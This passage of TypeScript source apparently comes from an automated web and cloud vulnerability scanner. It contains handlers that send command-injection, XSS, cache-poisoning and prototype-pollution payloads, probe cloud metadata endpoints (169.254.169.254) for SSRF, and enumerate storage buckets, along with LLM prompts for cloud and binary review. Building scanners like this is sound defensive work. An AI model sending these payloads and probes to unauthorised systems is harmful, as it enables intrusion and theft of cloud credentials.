                  httpRequest: `GET ${urlStr}\nHost: ${baseUrl.hostname}`,
                  httpResponse: `HTTP/1.1 200 (delayed ${elapsed}ms)`,
                });
              }
            } else {
              const resp = await fetch(urlStr, { signal: AbortSignal.timeout(8000), headers: { 'User-Agent': 'Mozilla/5.0 (compatible; T3MP3ST/1.0)' } });
              const body = await resp.text();

              // Distinguish command execution from parameter reflection.
              // If the full payload string appears in the response body, the server is reflecting
              // the input (e.g., search page echoing "Results for: | echo marker") — not executing it.
              // Real execution returns the marker text WITHOUT the surrounding command syntax.
              const isReflection = pl.payload ? (body.includes(pl.payload) || body.includes(encodeURIComponent(pl.payload))) : false;
              const markerPresent = pl.marker ? body.includes(pl.marker) : shellErrors.some(e => body.toLowerCase().includes(e));

              // Search-reflection check: sites that echo the search query will reflect
              // the marker even without any command executing (e.g. the server strips "& echo "
              // but reflects "t3mp3st_rce_confirm" as a search term). Send just the marker as
              // the param value — if it appears in that response too, it's plain reflection.
              let isSearchReflection = false;
              if (markerPresent && !isReflection && pl.marker) {
                try {
                  const baselineUrl = new URL(rawUrl);
                  baselineUrl.searchParams.set(param, pl.marker);
                  const baselineResp = await fetch(baselineUrl.toString(), { signal: AbortSignal.timeout(8000), headers: { 'User-Agent': 'Mozilla/5.0 (compatible; T3MP3ST/1.0)' } });
                  const baselineBody = await baselineResp.text();
                  isSearchReflection = baselineBody.includes(pl.marker);
                } catch { /* ignore — proceed with original result */ }
              }

              const confirmed = markerPresent && !isReflection && !isSearchReflection;

              results.push(`  [${param}] ${pl.name}: HTTP ${resp.status}${markerPresent && isReflection ? ' (marker reflected — not execution)' : ''}${confirmed ? ' ← INJECTION CONFIRMED' : ''}`);
              if (confirmed) {
                const evidence = pl.marker ? `marker "${pl.marker}" found in response (not reflected — payload stripped by shell)` : `shell error string found in response`;
                const curl = `curl -sk '${urlStr}'`;
                findings.push({
                  title: `OS Command Injection — ${param}`,
                  severity: 'critical' as const,
                  details: `Parameter "${param}" appears vulnerable to OS command injection. ${evidence}. Payload: ${pl.payload}\n\nVerify:\n${curl}`,
                  provenance: 'tool' as const, toolName: 'command_injection',
                  toolOutput: `${pl.name}: ${evidence}`,
                  httpRequest: `GET ${urlStr}\nHost: ${baseUrl.hostname}`,
                  httpResponse: `HTTP/1.1 ${resp.status}\n\n${body.slice(0, 300)}`,
                });
                break; // stop testing this param after confirmed finding
              }
            }
          } catch { /* timeout or network error */ }
        }
      }

      if (findings.length === 0) results.push('No command injection indicators found.');
      return { success: true, output: results.join('\n'), findings: findings.length > 0 ? findings : undefined };
    },
  },

  {
    name: 'http_param_pollution',
    description: 'Test for HTTP Parameter Pollution — send duplicate params with conflicting values to exploit server/WAF parsing differences',
    category: 'vuln',
    parameters: [
      { name: 'url', type: 'string', description: 'Target URL with query parameters', required: true },
    ],
    handler: async (context) => {
      const rawUrl = String(context.parameters.url).trim();
      let baseUrl: URL;
      try { baseUrl = new URL(rawUrl); } catch { return { success: false, error: `Invalid URL: ${rawUrl}` }; }

      const params = Array.from(baseUrl.searchParams.keys());
      if (params.length === 0) {
        return { success: true, output: `HPP test on ${rawUrl}: No query parameters found. Provide a URL with query params.` };
      }

      const nonce = Math.random().toString(36).slice(2, 8);
      const safeValue = 'safe_value';
      const malicious = `<img src=x onerror=alert('hpp-${nonce}')>`;
      const marker = `hpp-${nonce}`;

      const results: string[] = [`HTTP Parameter Pollution test on ${rawUrl} (marker: ${marker})`];
      const findings: NonNullable<ToolResult['findings']> = [];

      for (const param of params.slice(0, 8)) {
        // Variant 1: safe first, malicious second — WAF may only inspect first
        const url1 = new URL(rawUrl);
        url1.searchParams.set(param, safeValue);
        const url1Str = url1.toString() + `&${encodeURIComponent(param)}=${encodeURIComponent(malicious)}`;

        // Variant 2: malicious first, safe second — server may use first value
        const url2Str = rawUrl.replace(`${encodeURIComponent(param)}=`, '') + `&${encodeURIComponent(param)}=${encodeURIComponent(malicious)}&${encodeURIComponent(param)}=${encodeURIComponent(safeValue)}`;

        // Variant 3: array notation — param[]=x&param[]=<xss>
        const url3 = new URL(rawUrl);
        url3.searchParams.delete(param);
        const url3Str = url3.toString() + `&${encodeURIComponent(param + '[]')}=${encodeURIComponent(safeValue)}&${encodeURIComponent(param + '[]')}=${encodeURIComponent(malicious)}`;

        for (const [label, testUrl] of [['safe+malicious', url1Str], ['malicious+safe', url2Str], ['array notation', url3Str]] as [string, string][]) {
          try {
            const r = await fetch(testUrl, { signal: AbortSignal.timeout(6000), headers: { 'User-Agent': 'Mozilla/5.0 (compatible; T3MP3ST/1.0)' } });
            const ct = r.headers.get('content-type') ?? '';
            const body = await r.text();
            const reflected = body.includes(marker);
            results.push(`  [${param}] ${label}: HTTP ${r.status}${reflected ? ' ← MALICIOUS PARAM REFLECTED' : ''}`);
            if (reflected && ct.includes('html')) {
              findings.push({
                title: `HTTP Parameter Pollution — Malicious Value Reflected (${param})`,
                severity: 'medium' as const,
                details: `Duplicate parameter "${param}" (${label}) — the malicious value was reflected in the HTML response, suggesting the server uses a later/array value while a WAF may inspect only the first. URL: ${testUrl.slice(0, 200)}`,
                provenance: 'tool' as const, toolName: 'http_param_pollution',
                toolOutput: `${label}: malicious duplicate reflected (marker ${marker})`,
                httpRequest: `GET ${testUrl}\nHost: ${baseUrl.hostname}`,
                httpResponse: `HTTP/1.1 ${r.status}\n\n${body.slice(0, 200)}`,
              });
            }
          } catch { /* skip */ }
        }
      }

      if (findings.length === 0) results.push('No HPP reflection detected.');
      return { success: true, output: results.join('\n'), findings: findings.length > 0 ? findings : undefined };
    },
  },

  {
    name: 'web_cache_poisoning',
    description: 'Test for web cache poisoning via unkeyed HTTP request headers (X-Forwarded-Host, X-Host, etc.)',
    category: 'vuln',
    parameters: [
      { name: 'url', type: 'string', description: 'Target URL to test for cache poisoning', required: true },
    ],
    handler: async (context) => {
      const url = String(context.parameters.url).trim();
      let parsed: URL;
      try { parsed = new URL(url); } catch { return { success: false, error: `Invalid URL: ${url}` }; }

      const canary = `t3mp3st-${Math.random().toString(36).slice(2, 10)}.attacker.com`;
      const results: string[] = [`Web Cache Poisoning test on ${url}`, `Canary domain: ${canary}`];
      const findings: NonNullable<ToolResult['findings']> = [];

      // Headers to test as unkeyed cache keys
      const headerTests = [
        { header: 'X-Forwarded-Host', value: canary },
        { header: 'X-Host', value: canary },
        { header: 'X-Forwarded-Server', value: canary },
        { header: 'X-Original-URL', value: `https://${canary}/` },
        { header: 'X-Forwarded-Port', value: '1337' },
        { header: 'X-Forwarded-Scheme', value: 'nothttps' },
        { header: 'X-HTTP-Method-Override', value: 'DELETE' },
      ];

      // Baseline — note cache headers
      let cacheStatus = '';
      try {
        const base = await fetch(url, { signal: AbortSignal.timeout(6000), headers: { 'User-Agent': 'Mozilla/5.0 (compatible; T3MP3ST/1.0)' } });
        cacheStatus = base.headers.get('cf-cache-status') ?? base.headers.get('x-cache') ?? base.headers.get('cache-control') ?? 'unknown';
        results.push(`Cache baseline: ${cacheStatus}`);
      } catch { /* continue */ }

      for (const { header, value } of headerTests) {
        try {
          const r = await fetch(url, {
            signal: AbortSignal.timeout(6000),
            headers: { 'User-Agent': 'Mozilla/5.0 (compatible; T3MP3ST/1.0)', [header]: value },
          });
          const body = await r.text();
          const ct = r.headers.get('content-type') ?? '';
          const reflectedInBody = body.includes(canary) || body.includes('1337') && header === 'X-Forwarded-Port';
          const cacheHit = r.headers.get('cf-cache-status') === 'HIT' || (r.headers.get('x-cache') ?? '').includes('HIT');
          const newCacheStatus = r.headers.get('cf-cache-status') ?? r.headers.get('x-cache') ?? '';

          results.push(`  ${header}: ${value} → HTTP ${r.status}, cache: ${newCacheStatus}${reflectedInBody ? ' ← REFLECTED IN BODY' : ''}`);

          if (reflectedInBody && ct.includes('html')) {
            findings.push({
              title: `Web Cache Poisoning — ${header} Reflected`,
              severity: 'high' as const,
              details: `Header "${header}: ${value}" was reflected in the HTML response body. If this response is cached, all subsequent visitors will receive the injected content (cache poisoning). Cache status: ${newCacheStatus}.`,
              provenance: 'tool' as const, toolName: 'web_cache_poisoning',
              toolOutput: `${header} reflected in body. Cache: ${newCacheStatus}`,
              httpRequest: `GET ${url}\nHost: ${parsed.hostname}\n${header}: ${value}`,
              httpResponse: `HTTP/1.1 ${r.status}\ncf-cache-status: ${newCacheStatus}\n\n...${body.slice(body.indexOf(canary) - 50, body.indexOf(canary) + canary.length + 50).replace(/\s+/g, ' ')}...`,
            });
          } else if (cacheHit && reflectedInBody) {
            findings.push({
              title: `Web Cache Poisoning — Cache HIT with Injected Header`,
              severity: 'critical' as const,
              details: `Response with "${header}: ${canary}" was served from cache (HIT) and the injected value appeared in the body. This confirms cache poisoning — poisoned content is being served to all visitors.`,
              provenance: 'tool' as const, toolName: 'web_cache_poisoning',
              toolOutput: `CACHE HIT with ${header} reflected`,
              httpRequest: `GET ${url}\n${header}: ${value}`,
              httpResponse: `HTTP/1.1 ${r.status}\ncf-cache-status: HIT`,
            });
          }
        } catch { /* skip */ }
      }

      if (findings.length === 0) results.push('No cache poisoning via unkeyed headers detected.');
      return { success: true, output: results.join('\n'), findings: findings.length > 0 ? findings : undefined };
    },
  },

  {
    name: 'prototype_pollution',
    description: 'Test for JavaScript prototype pollution via GET params (__proto__, constructor.prototype) and JSON POST bodies',
    category: 'vuln',
    parameters: [
      { name: 'url', type: 'string', description: 'Target URL to test', required: true },
    ],
    handler: async (context) => {
      const url = String(context.parameters.url).trim();
      let parsed: URL;
      try { parsed = new URL(url); } catch { return { success: false, error: `Invalid URL: ${url}` }; }

      const sentinel = `pp_${Math.random().toString(36).slice(2, 8)}`;
      const results: string[] = [`Prototype Pollution test on ${url}`, `Sentinel: ${sentinel}`];
      const findings: NonNullable<ToolResult['findings']> = [];

      // Error markers that indicate __proto__ processing
      const errorMarkers = ['__proto__', 'prototype pollution', 'typeerror', 'cannot set property', 'cyclic', 'illegal prototype'];

      // Baseline
      let baselineStatus = 0;
      try {
        const r = await fetch(url, { signal: AbortSignal.timeout(5000) });
        await r.text();
        baselineStatus = r.status;
      } catch { /* continue */ }

      // GET param pollution variants
      const getPayloads = [
        { param: '__proto__[t3pp]', value: sentinel, name: '__proto__ bracket notation' },
        { param: '__proto__.t3pp', value: sentinel, name: '__proto__ dot notation (encoded)' },
        { param: 'constructor[prototype][t3pp]', value: sentinel, name: 'constructor.prototype bracket' },
        { param: '__proto__[isAdmin]', value: 'true', name: '__proto__ isAdmin' },
        { param: '__proto__[debug]', value: 'true', name: '__proto__ debug flag' },
      ];

      for (const gp of getPayloads) {
        try {
          const testUrl = new URL(url);
          const rawStr = testUrl.toString() + (testUrl.search ? '&' : '?') + `${encodeURIComponent(gp.param)}=${encodeURIComponent(gp.value)}`;
          const r = await fetch(rawStr, { signal: AbortSignal.timeout(5000), headers: { 'User-Agent': 'Mozilla/5.0 (compatible; T3MP3ST/1.0)' } });
          const body = await r.text();
          const bodyLower = body.toLowerCase();
          const hasError = errorMarkers.some(e => bodyLower.includes(e));
          const statusChange = r.status !== baselineStatus;
          // WAFs routinely block requests containing __proto__ and constructor[prototype] —
          // a 403/429 response is the WAF working correctly, not prototype pollution evidence.
          const isWafBlock = r.status === 403 || r.status === 429;
          results.push(`  GET [${gp.name}]: HTTP ${r.status}${isWafBlock ? ' (WAF block — expected)' : ''}${hasError ? ' ← ERROR MARKER' : ''}${statusChange && !isWafBlock ? ' ← STATUS CHANGED' : ''}`);
          if (hasError || (statusChange && !isWafBlock)) {
            const reason = hasError ? 'triggered prototype pollution error markers in response body' : `caused unexpected status change (${baselineStatus}→${r.status})`;
            const curl = `curl -sk '${rawStr}'`;
            findings.push({
              title: `Prototype Pollution (GET) — ${gp.name}`,
              severity: 'high' as const,
              details: `GET param "${gp.param}=${gp.value}" ${reason}. May indicate server-side prototype pollution in query parser (qs, querystring).\n\nVerify:\n${curl}`,
              provenance: 'tool' as const, toolName: 'prototype_pollution',
              toolOutput: `${gp.name}: ${reason}`,
              httpRequest: `GET ${rawStr}\nHost: ${parsed.hostname}`,
              httpResponse: `HTTP/1.1 ${r.status}\n\n${body.slice(0, 200)}`,
            });
          }
        } catch { /* skip */ }
      }

      // JSON POST body pollution — use Record to avoid __proto__ literal type inference issues
      const jsonPayloads: { body: Record<string, unknown>; name: string }[] = [
        { body: JSON.parse(`{"__proto__":{"t3pp":"${sentinel}"}}`), name: '__proto__ in POST body' },
        { body: { constructor: { prototype: { t3pp: sentinel } } }, name: 'constructor.prototype in POST body' },
        { body: JSON.parse('{"__proto__":{"isAdmin":true}}'), name: '__proto__.isAdmin POST' },
      ];

      for (const jp of jsonPayloads) {
        try {
          const r = await fetch(url, {
            method: 'POST',
            signal: AbortSignal.timeout(5000),
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (compatible; T3MP3ST/1.0)' },
            body: JSON.stringify(jp.body),
          });
          const body = await r.text();
          const bodyLower = body.toLowerCase();
          const hasError = errorMarkers.some(e => bodyLower.includes(e));
          const statusChange = r.status !== baselineStatus;
          results.push(`  POST JSON [${jp.name}]: HTTP ${r.status}${hasError ? ' ← ERROR MARKER' : ''}${statusChange ? ' ← STATUS CHANGED' : ''}`);
          if (hasError || (statusChange && r.status === 200 && baselineStatus !== 200)) {
            const bodyStr = JSON.stringify(jp.body);
            const curl = `curl -sk -X POST '${url}' -H 'Content-Type: application/json' -d '${bodyStr.replace(/'/g, "'\\''")}'`;
            findings.push({
              title: `Prototype Pollution (JSON POST) — ${jp.name}`,
              severity: 'high' as const,
              details: `POST body with "${jp.name}" ${hasError ? 'triggered prototype pollution error' : 'changed response status'}. May allow privilege escalation if server merges body into a shared object without sanitization.\n\nVerify:\n${curl}`,
              provenance: 'tool' as const, toolName: 'prototype_pollution',
              toolOutput: `${jp.name}: HTTP ${r.status}`,
              httpRequest: `POST ${url}\nContent-Type: application/json\n\n${JSON.stringify(jp.body)}`,
              httpResponse: `HTTP/1.1 ${r.status}\n\n${body.slice(0, 200)}`,
            });
          }
        } catch { /* skip */ }
      }

      if (findings.length === 0) results.push('No prototype pollution indicators detected. (Note: Successful pollution often requires application-specific knowledge to confirm.)');
      return { success: true, output: results.join('\n'), findings: findings.length > 0 ? findings : undefined };
    },
  },

  // ===========================================================================
  // CLOUD / INFRA TOOLS
  // ===========================================================================
  {
    name: 'cloud_metadata_probe',
    description: 'Probe cloud provider metadata service endpoints (AWS IMDS, GCP metadata, Azure IMDS) both on well-known IPs and via the target host (SSRF detection)',
    category: 'web',
    parameters: [
      { name: 'target', type: 'string', description: 'Target hostname or IP to probe for SSRF metadata access', required: true },
      { name: 'provider', type: 'string', description: 'Provider to probe: aws | gcp | azure | auto (probes all)', required: false, default: 'auto' },
    ],
    handler: async (context) => {
      const target   = String(context.parameters.target ?? '').trim();
      const provider = String(context.parameters.provider ?? 'auto').trim();
      if (!target) return { success: false, error: 'target parameter required' };

      interface MetaEndpoint { label: string; url: string; headers?: Record<string, string>; via?: string; }
      const endpoints: MetaEndpoint[] = [];

      if (provider === 'aws' || provider === 'auto') {
        endpoints.push(
          { label: 'AWS IMDS v1 meta-data', url: 'http://169.254.169.254/latest/meta-data/', via: 'direct' },
          { label: 'AWS IMDS v1 user-data', url: 'http://169.254.169.254/latest/user-data', via: 'direct' },
          { label: 'AWS IMDS v1 via target (SSRF)', url: `http://${target}/latest/meta-data/`, via: 'target' },
        );
      }
      if (provider === 'gcp' || provider === 'auto') {
        endpoints.push(
          { label: 'GCP metadata (direct)',       url: 'http://metadata.google.internal/computeMetadata/v1/?recursive=true', headers: { 'Metadata-Flavor': 'Google' }, via: 'direct' },
          { label: 'GCP metadata via target',     url: `http://${target}/computeMetadata/v1/`, headers: { 'Metadata-Flavor': 'Google' }, via: 'target' },
        );
      }
      if (provider === 'azure' || provider === 'auto') {
        endpoints.push(
          { label: 'Azure IMDS (direct)',         url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', headers: { 'Metadata': 'true' }, via: 'direct' },
          { label: 'Azure IMDS via target',       url: `http://${target}/metadata/instance?api-version=2021-02-01`, headers: { 'Metadata': 'true' }, via: 'target' },
        );
      }

      const results: string[] = [];
      const findings: NonNullable<ToolResult['findings']> = [];

      for (const ep of endpoints) {
        try {
          const resp = await fetch(ep.url, {
            method: 'GET',
            headers: { 'User-Agent': 'curl/7.88', ...(ep.headers ?? {}) },
            signal: AbortSignal.timeout(5000),
          });
          const body = (await resp.text()).slice(0, 500);
          const accessible = resp.status >= 200 && resp.status < 400;
          results.push(`  ${accessible ? '✓' : '✗'} ${ep.label}: HTTP ${resp.status}${accessible ? ` — ${body.slice(0, 100)}` : ''}`);
          if (accessible && ep.via === 'target') {
            findings.push({
              title: `SSRF via cloud metadata — ${ep.label}`,
              severity: 'critical' as const,
              details: `Target ${target} returned cloud metadata content (${resp.status}). This indicates SSRF to cloud metadata service.\n\nURL: ${ep.url}\nResponse preview: ${body.slice(0, 300)}`,
              provenance: 'tool' as const, toolName: 'cloud_metadata_probe',
              toolOutput: `HTTP ${resp.status}: ${body.slice(0, 200)}`,
            });
          }
          if (accessible && ep.via === 'direct') {
            findings.push({
              title: `Cloud metadata service accessible — ${ep.label}`,
              severity: 'info' as const,
              details: `Cloud metadata endpoint is reachable from the scanner. This is expected for cloud-hosted targets but confirms cloud provider fingerprint.\n\nURL: ${ep.url}\nResponse preview: ${body.slice(0, 300)}`,
              provenance: 'tool' as const, toolName: 'cloud_metadata_probe',
              toolOutput: `HTTP ${resp.status}: ${body.slice(0, 200)}`,
            });
          }
        } catch {
          results.push(`  ✗ ${ep.label}: unreachable`);
        }
      }

      return {
        success: true,
        output: `Cloud metadata probe for ${target} (provider: ${provider}):\n${results.join('\n')}`,
        findings: findings.length > 0 ? findings : undefined,
      };
    },
  },
  {
    name: 's3_bucket_check',
    description: 'Enumerate public cloud storage buckets derived from a target domain — checks AWS S3, GCS, and Azure Blob Storage for public access',
    category: 'cloud',
    parameters: [
      { name: 'target', type: 'string', description: 'Domain or organization name to generate bucket permutations from', required: true },
    ],
    handler: async (context) => {
      const target = String(context.parameters.target ?? '').trim().replace(/^https?:\/\//, '').split('/')[0];
      if (!target) return { success: false, error: 'target parameter required' };

      // Strip subdomains to get the base name for permutations
      const parts = target.split('.');
      const baseName = parts.length >= 2 ? parts[parts.length - 2] : target;

      const suffixes = ['', '-backup', '-prod', '-staging', '-dev', '-test', '-data', '-assets', '-static', '-logs', '-uploads', '-files', '-public', '-private'];
      const bucketNames = suffixes.map(s => `${baseName}${s}`).filter(n => n.length >= 3);

      interface BucketEndpoint { name: string; url: string; provider: string; }
      const toCheck: BucketEndpoint[] = [];
      for (const b of bucketNames) {
        toCheck.push({ name: b, url: `https://${b}.s3.amazonaws.com/`,           provider: 'AWS S3' });
        toCheck.push({ name: b, url: `https://storage.googleapis.com/${b}`,      provider: 'GCS' });
        toCheck.push({ name: b, url: `https://${b}.blob.core.windows.net/`,      provider: 'Azure Blob' });
      }

      const results: string[] = [];
      const findings: NonNullable<ToolResult['findings']> = [];

      for (const ep of toCheck) {
        try {
          const resp = await fetch(ep.url, { method: 'HEAD', signal: AbortSignal.timeout(6000) });
          // 200/403 = exists (403 = private but exists); 404 = doesn't exist
          const exists   = resp.status !== 404;
          const isPublic = resp.status === 200 || resp.status === 206;
          if (exists) {
            results.push(`  ${isPublic ? '✓ PUBLIC' : '⚠ EXISTS'} [${ep.provider}] ${ep.name}: HTTP ${resp.status}`);
            if (isPublic) {
              findings.push({
                title: `Public cloud storage bucket — ${ep.name} (${ep.provider})`,
                severity: 'high' as const,
                details: `Bucket "${ep.name}" on ${ep.provider} is publicly accessible (HTTP ${resp.status}).\n\nURL: ${ep.url}\n\nVerify contents are intentionally public.`,
                provenance: 'tool' as const, toolName: 's3_bucket_check',
                toolOutput: `HTTP ${resp.status} ${ep.url}`,
              });
            }
          }
        } catch { /* unreachable — skip */ }
      }

      if (results.length === 0) results.push('No public or existing buckets found in common permutations.');
      return {
        success: true,
        output: `Cloud storage bucket check for "${baseName}" (${toCheck.length} endpoints):\n${results.join('\n')}`,
        findings: findings.length > 0 ? findings : undefined,
      };
    },
  },
  {
    name: 'llm_cloud_review',
    description: 'LLM-based cloud security review — analyzes reconnaissance and scan findings through a focused cloud security lens',
    category: 'cloud',
    parameters: [
      { name: 'target', type: 'string', description: 'Cloud target (hostname, endpoint, account ID)', required: true },
      { name: 'focus', type: 'string', description: 'Analysis focus: iam_misconfig | exposed_endpoints | credential_leakage | network_exposure', required: false, default: 'iam_misconfig' },
      { name: 'context', type: 'string', description: 'Prior scan findings / recon output to analyze', required: false, default: '' },
    ],
    handler: async (context) => {
      const llm = context.llm as LLMBackbone | undefined;
      if (!llm) return { success: false, error: 'llm_cloud_review requires an LLM backbone — set API key in Settings' };

      const target  = String(context.parameters.target ?? '').trim();
      const focus   = String(context.parameters.focus   ?? 'iam_misconfig').trim();
      const ctx     = String(context.parameters.context ?? '').trim();

      const focusDesc: Record<string, string> = {
        iam_misconfig:      'IAM misconfigurations: overly permissive roles, wildcard policies, missing MFA, cross-account trust issues, privilege escalation paths',
        exposed_endpoints:  'Exposed endpoints: unauthenticated APIs, open management ports, public dashboards, debug interfaces, insecure CORS',
        credential_leakage: 'Credential leakage: API keys in responses/headers, service account tokens, metadata credential exposure, S3 pre-signed URL abuse',
        network_exposure:   'Network exposure: security group misconfigs, unrestricted inbound rules, unprotected internal services reachable from internet, cloud NAT leakage',
      };

      const systemPrompt = `You are a cloud security expert performing a focused ${focus} review.
Target: ${target}

Your task: Analyze the provided reconnaissance and scan data to identify ${focusDesc[focus] ?? focus}.

For each finding:
- Assign severity (critical/high/medium/low/info)
- Give a specific, actionable title
- Explain the exact misconfiguration or exposure
- Provide a concrete remediation step

Return a JSON array of findings:
[{"title":"...","severity":"critical|high|medium|low|info","details":"...","remediation":"..."}]

If no issues found, return [].`;

      const userMsg = ctx
        ? `Analyze these findings for ${focus} issues:\n\n${ctx.slice(0, 8000)}`
        : `No prior scan data available. Based on the target "${target}", describe what ${focus} issues are most commonly found and how to check for them.`;

      try {
        const raw = await llm.prompt(userMsg, systemPrompt, { maxTokens: 2000 });
        let parsed: Array<{ title: string; severity: string; details: string; remediation?: string }> = [];
        const jsonMatch = raw.match(/\[[\s\S]*\]/);
        if (jsonMatch) {
          try { parsed = JSON.parse(jsonMatch[0]); } catch { /* fall through */ }
        }

        const findings: NonNullable<ToolResult['findings']> = parsed
          .filter(f => f.title && f.severity)
          .map(f => ({
            title: f.title,
            severity: (['critical','high','medium','low','info'].includes(f.severity) ? f.severity : 'medium') as 'critical' | 'high' | 'medium' | 'low' | 'info',
            details: `${f.details ?? ''}\n\nRemediation: ${f.remediation ?? 'See cloud provider security best practices.'}`,
            provenance: 'model' as const,
            toolName: 'llm_cloud_review',
            toolOutput: f.details?.slice(0, 200),
          }));

        return {
          success: true,
          output: findings.length > 0
            ? `LLM cloud review [${focus}]: ${findings.length} issue(s) found for ${target}\n` +
              findings.slice(0, 5).map(f => `  [${f.severity.toUpperCase()}] ${f.title}`).join('\n')
            : `LLM cloud review [${focus}]: no issues found for ${target}`,
          findings: findings.length > 0 ? findings : undefined,
          additionalEvidence: [{ type: 'command' as const, content: `llm_cloud_review(target="${target}", focus="${focus}")` }],
        };
      } catch (err) {
        return { success: false, error: `LLM cloud review failed: ${err instanceof Error ? err.message : String(err)}` };
      }
    },
  },

  // ===========================================================================
  // BINARY REVERSE ENGINEERING TOOLS
  // ===========================================================================
  {
    name: 'llm_binary_review',
    description: 'LLM-based binary security review — analyzes disassembled / decompiled binary code for vulnerability patterns',
    category: 'code',
    parameters: [
      { name: 'binary_path', type: 'string', description: 'Binary target (local:// reference or plain filename)', required: true },
      { name: 'focus', type: 'string', description: 'Analysis focus: memory_corruption | format_string | crypto_weakness | backdoor_indicators | report_synthesis', required: false, default: 'memory_corruption' },
      { name: 'context', type: 'string', description: 'Prior analysis output (radare2/Ghidra disassembly, strings, function list) to analyze', required: false, default: '' },
    ],
    handler: async (context) => {
      const llm = context.llm as LLMBackbone | undefined;
      if (!llm) return { success: false, error: 'llm_binary_review requires an LLM backbone — set API key in Settings' };

      const binaryPath = String(context.parameters.binary_path ?? '').trim();
      const focus      = String(context.parameters.focus        ?? 'memory_corruption').trim();
      let   ctx        = String(context.parameters.context      ?? '').trim();

      const focusDesc: Record<string, string> = {
        memory_corruption:    'memory corruption vulnerabilities: buffer overflows (stack/heap), use-after-free (UAF), double-free, off-by-one, out-of-bounds reads/writes, integer overflows leading to heap corruption, ROP gadget chains enabled by missing mitigations (no canary / NX disabled / no RELRO / no PIE), IOCTL misuse with unsanitized kernel parameters — use the security mitigations section to assess ROP viability and the call-site xrefs to identify exactly which functions are exploitable',
        format_string:        'format string vulnerabilities: printf/sprintf/fprintf with unsanitized user input as format string, arbitrary read/write primitives',
        crypto_weakness:      'cryptographic weaknesses: hardcoded credentials/keys/IVs, XOR-obfuscated passwords, insecure random number generation (rand/srand with time seed), weak cipher modes (ECB, single-byte XOR), deprecated hash functions (MD5/SHA1), embedded private keys, AWS/GCP/Azure access keys',
        backdoor_indicators:  'backdoor indicators: hardcoded credentials, hidden command strings, network C2 callbacks, anti-analysis/anti-debug checks, covert channels, command injection via system(), encoded payload stubs, race conditions',
        report_synthesis:     'all vulnerability categories together — produce a comprehensive reverse engineering report with executive summary, function inventory, confirmed vulnerabilities ranked by severity, and recommended next steps',
      };

      const systemPrompt = `You are an expert binary security analyst performing focused reverse engineering.
Binary: ${binaryPath}
Focus: ${focus} — ${focusDesc[focus] ?? focus}

Analyze the provided disassembly, strings output, function list, and tool output to identify ${focusDesc[focus] ?? focus}.

CRITICAL RULES FOR EVIDENCE EXTRACTION — always follow these:
- Hardcoded credentials: include the EXACT value found (e.g., "AKIAIOSFODNN7EXAMPLE1", "wJalrXUtnFEMI/...", "admin:Sup3rS3cr3t!"). Never say "credentials found" without quoting them.
- XOR obfuscation: state the exact XOR key byte (e.g., "key=0x5A"), list the encoded byte array if visible, and the decoded plaintext if recoverable.
- Embedded keys: include the full PEM header (BEGIN/END line) and at least the first line of key data.
- C2/network: include the exact IP address AND port (e.g., "192.168.13.37:4444").
- Backdoor strings: quote the exact trigger string (e.g., "AGENT_INIT_7F3A").
- Memory corruption: name the vulnerable function, the buffer size, and what overflows it.
- Use-after-free: trace the alloc → free → use sequence with function names.
- Integer overflow: show the exact multiplication/addition that overflows.
- Command injection: quote the vulnerable snprintf/system call pattern with the unsanitized parameter.

For each finding produce:
- title: short descriptive name
- severity: critical | high | medium | low | info
- function: affected function name (if known)
- address: hex address (if known)
- details: technical description with ALL concrete evidence — exact values, function names, byte sequences, addresses from the data
- mitigation: concrete remediation step

Return ONLY a JSON array (no markdown fences, no prose outside):
[{"title":"...","severity":"...","function":"...","address":"...","details":"...","mitigation":"..."}]

For report_synthesis: emit a plain-text executive summary first, THEN the JSON array.
If no issues found, return [].`;

      // Auto-gather context from the binary sidecar when the caller doesn't supply it.
      // This makes the tool usable as a single call: llm_binary_review(binary_path, focus)
      if (!ctx || ctx.length < 80) {
        const fname    = binaryPath.startsWith('local://') ? binaryPath.slice(8) : binaryPath;
        const filePath = fname.startsWith('/') ? fname : `/data/uploads/${fname}`;

        const [strOut, r2Out, fileOut] = await Promise.all([
          callSidecar('binary', 'strings', ['-n', '8', filePath], {}, 30000),
          callSidecar('binary', 'r2',
            ['-q', '-A', '-c', 'afl;ii;is;iz;iS;iE', filePath], {}, 60000),
          callSidecar('binary', 'file', [filePath], {}, 10000),
        ]);

        const gathered = [
          `=== FILE TYPE ===\n${fileOut.stdout.slice(0, 500)}`,
          `=== STRINGS (min 8) ===\n${strOut.stdout.slice(0, 5000)}`,
          `=== RADARE2 ANALYSIS (functions / imports / symbols / strings) ===\n${r2Out.stdout.slice(0, 5000)}`,
        ].join('\n\n');

        if (gathered.length < 100) {
          return {
            success: false,
            error: `llm_binary_review: binary sidecar returned no data for "${binaryPath}". Ensure the file exists in /data/uploads/ and the binary sidecar is running.`,
          };
        }
        ctx = gathered;

        // Memory corruption and format string analysis needs deeper context:
        // security mitigations (stack canary / NX / RELRO / PIE) to assess ROP viability,
        // and cross-references to dangerous libc calls to pinpoint vulnerable functions.
        if (focus === 'memory_corruption' || focus === 'format_string') {
          const dangerousImports = focus === 'format_string'
            ? ['sym.imp.printf', 'sym.imp.sprintf', 'sym.imp.fprintf', 'sym.imp.snprintf', 'sym.imp.vprintf', 'sym.imp.vsprintf']
            : ['sym.imp.gets', 'sym.imp.strcpy', 'sym.imp.strcat', 'sym.imp.sprintf', 'sym.imp.scanf', 'sym.imp.memcpy', 'sym.imp.read', 'sym.imp.fgets'];
          const xrefCmds = dangerousImports.map(f => `axt ${f}`).join(';');
          const deepR2 = await callSidecar('binary', 'r2',
            ['-q', '-A', '-c', `iI;${xrefCmds};pdf @main`, filePath], {}, 90000);
          if (deepR2.stdout.length > 50) {
            ctx += `\n\n=== SECURITY MITIGATIONS (canary / NX / RELRO / PIE) + DANGEROUS CALL SITES ===\n${deepR2.stdout.slice(0, 6000)}`;
          }
        }
      }

      const userMsg = `Analyze the following binary analysis output:\n\n${ctx.slice(0, 14000)}`;

      try {
        const raw = await llm.prompt(userMsg, systemPrompt, { maxTokens: 3000 });
        let parsed: Array<{ title: string; severity: string; function?: string; address?: string; details: string; mitigation?: string }> = [];
        const jsonMatch = raw.match(/\[[\s\S]*\]/);
        if (jsonMatch) {
          try { parsed = JSON.parse(jsonMatch[0]); } catch { /* fall through */ }
        }

        const findings: NonNullable<ToolResult['findings']> = parsed
          .filter(f => f.title && f.severity)
          .map(f => ({
            title: f.title,
            severity: (['critical','high','medium','low','info'].includes(f.severity) ? f.severity : 'medium') as 'critical' | 'high' | 'medium' | 'low' | 'info',
